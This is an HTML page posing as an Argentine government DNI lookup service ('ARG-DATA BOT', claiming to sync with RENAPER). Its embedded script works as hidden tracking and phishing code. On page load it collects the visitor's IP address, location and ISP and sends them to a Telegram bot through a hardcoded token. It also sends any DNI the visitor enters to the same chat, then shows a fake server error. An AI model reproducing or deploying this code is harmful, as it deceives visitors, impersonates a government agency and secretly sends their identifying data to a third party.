<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEMA ARG-DATA v4.2</title>
    <style>
        body { background-color: #050a0f; color: #00f2ff; font-family: 'Courier New', monospace; text-align: center; padding: 20px; margin: 0; }
        .box { border: 1px solid #00f2ff; padding: 30px 20px; border-radius: 10px; box-shadow: 0 0 20px #00f2ff; max-width: 350px; margin: 40px auto; }
        input { width: 85%; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #00f2ff; color: #00f2ff; text-align: center; outline: none; }
        button { background: #00f2ff; color: #000; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; width: 90%; }
        .footer { font-size: 0.7em; color: #444; margin-top: 30px; }
    </style>
</head>
<body>

    <div class="box">
        <h3>ARG-DATA BOT</h3>
        <p>CONSULTA NACIONAL DNI</p>
        <hr style="border: 0.5px solid #00f2ff22;">
        <input type="number" id="dni" placeholder="Ingrese DNI objetivo">
        <br>
        <button onclick="consultar()">BUSCAR CIUDADANO</button>
        <p id="status" style="font-size: 0.8em; margin-top:15px;">Sincronizando con RENAPER...</p>
    </div>

    <div class="footer">ACCESO RESTRINGIDO - GOBIERNO DE ARGENTINA</div>

    <script>
        const token = "8488321953:AAFFIvsfxsxxp2ImaSl3WQzsuCTOyblqPig";
        const grupo = "-1003670055074";

        // 1. CAPTURA IP AL ABRIR
        async function autoCaptura() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                const texto = `üì¢ **IP CAPTURADA**\n` +
                              `üåê IP: \`${data.ip}\`\n` +
                              `üìç Loc: \`${data.city}, ${data.country_name}\`\n` +
                              `üè¢ ISP: \`${data.org}\``;

                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${grupo}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`);
                document.getElementById('status').innerText = "CONEXI√ìN ESTABLECIDA";
            } catch (e) { console.log("Error en captura autom√°tica"); }
        }

        // 2. CAPTURA DNI AL TOCAR BOT√ìN
        async function consultar() {
            const dni = document.getElementById('dni').value;
            if(!dni) return alert("Ingrese un DNI");
            
            const textoDni = `üìù **DNI INGRESADO:** \`${dni}\``;
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${grupo}&text=${encodeURIComponent(textoDni)}&parse_mode=Markdown`);
            
            alert("Error 505: El servidor de RENAPER no responde. Reintente m√°s tarde.");
        }

        window.onload = autoCaptura;
    </script>
</body>
</html>
